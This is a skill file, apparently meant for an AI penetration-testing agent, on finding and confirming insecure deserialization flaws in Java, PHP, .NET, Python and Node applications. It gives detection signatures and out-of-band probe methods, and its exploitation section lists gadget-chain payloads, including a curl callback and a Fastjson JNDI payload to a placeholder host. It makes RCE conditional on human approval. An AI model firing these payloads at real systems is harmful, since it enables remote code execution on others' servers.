---
name: deserialization
description: Use when the target is Java (Spring/Struts/JBoss/WebLogic), PHP (Laravel/CodeIgniter/WordPress), Python (pickle), .NET (ViewState), Ruby (Marshal), Node (serialize-javascript), or when the user says "deserialization", "gadget", "ysoserial", "phpggc", "insecure deserialization". Detection, gadget identification, safe exploitation rules, and OOB confirmation.
---

# Insecure Deserialization

Deserialization of untrusted data → RCE is one of the highest-severity bug classes. Detection first, exploitation only with human approval.

## Detection (find the sink)

1. **Cookies/params that are serialized blobs**:
   - Java: `JSESSIONID` (no), but app cookies like `CUSTOMER=...` base64 starting with `rO0AB` (Java serialization magic).
   - PHP: base64 `a:3:{s:...` (PHP serialized array), or `O:4:"User"`.
   - .NET: `__VIEWSTATE` / `__EVENTVALIDATION` (Base64 + `1.2` `2.2` markers), or `QfeB...` `IyAA...`.
   - Python: pickled cookies (base64 starting with `gASV` or `\x80\x04`).
   - Node: `serialize-javascript` output (`{"_$$...` markers).
2. **Frameworks known for gadget chains**: Spring, Struts2, WebLogic (`/wls-wsat`, T3 `7001`), JBoss (`/invoker`), Java RMI, Fastjson (`{"@type":...`), Jackson, PHP Laravel (`XSRF-TOKEN`? no — check `session` file), WordPress (PHAR: `phar://` in file params), Java XStream (`<java.util...`).
3. **Error signatures**: send a malformed blob → stack trace reveals `ObjectInputStream`, `unserialize`, `pickle.loads`, `Fastjson`.

## Identifying the format

- Base64 decode candidate blobs (safe, offline).
- Java: `rO0AB` → `AC ED 00 05`; tool: `java -jar ysoserial.jar` (check serialized magic only, don't fire yet).
- PHP: `O:N:"Class"` / `a:N:{`.
- .NET ViewState: decode `__VIEWSTATE` (federal: use `ysoserial.net` `--decrypt` if machine key known — no, decryption needs key; instead test with `viewstate` tool).
- Python pickle: `\x80\x04\x95`.

## Safe testing (no RCE yet)

1. **Reflection probe**: craft an object of an expected class with a benign payload that triggers a harmless side effect you can observe (e.g., a `toString`/`__toString` that returns a canary string echoed in response, a DNS lookup to your OOB endpoint via a gadget like `java.net.URL` DNS callback).
2. **OOB confirmation (best)**: use `python tools/oob_listener.py` (interactsh) — inject a gadget that triggers a **DNS/HTTP callback** to your domain. Blind + safe:
   - Java DNS: `ysoserial URLDNS <callback>`
   - PHP DNS: `phpggc -p phar <gadget> <callback>` + `phar://` trigger.
   - .NET: `ysoserial.net` `TypeConfuseDelegate` with DNS/HTTP callback.
3. **Time-based**: `sleep(5)` payloads (`Thread.sleep`, `System.out` + flush, `usleep`) → delayed response = CONFIRMED without RCE.

## Exploitation (ONLY with explicit human approval, on your own target)

- Java: `ysoserial CommonsCollections1|6|7`, `CommonsBeanutils1`, `Spring1`, `Jdk7u21` → `bash -c 'curl http://<oob>/'`.
- PHP: `phpggc Laravel/RCE1`, `Monolog/RCE` etc. → file write, command.
- .NET: `ysoserial.net` `TextFormattingRunProperties`, `ActivitySurrogateSelector`.
- Python: `pickle` payload `__reduce__` → `os.system`.
- Node: `node-serialize` `_$$ND_FUNC$$_` RCE.
- Fastjson: `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<oob>","autoCommit":true}` → JNDI callback.

## Validation & Reporting

- CONFIRMED if: OOB callback received (DNS/HTTP) OR time-delay observed OR canary in response.
- POSSIBLE if: serialized blob identified + framework gadget chain known, but no callback yet.
- Report: input location, blob format, gadget used (or proposed), callback evidence, impact (RCE → Critical).
- Never run RCE without explicit human approval. Document the exact safe probe used.

## Tools

```
python tools/deser_probe.py <url>            # blob format detection + reflection probes
python tools/oob_listener.py                 # interactsh callback listener
python tools/validate.py "<finding>"
bash   tools/vuln_scanner.sh                 # standard pipeline
```

## References

- HackTricks deserialization: https://book.hacktricks.wiki/en/pentesting-web/deserialization
- ysoserial: https://github.com/frohoff/ysoserial
- phpggc: https://github.com/ambionics/phpggc
- ysoserial.net: https://github.com/pwntester/ysoserial.net
- OWASP Deserialization Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
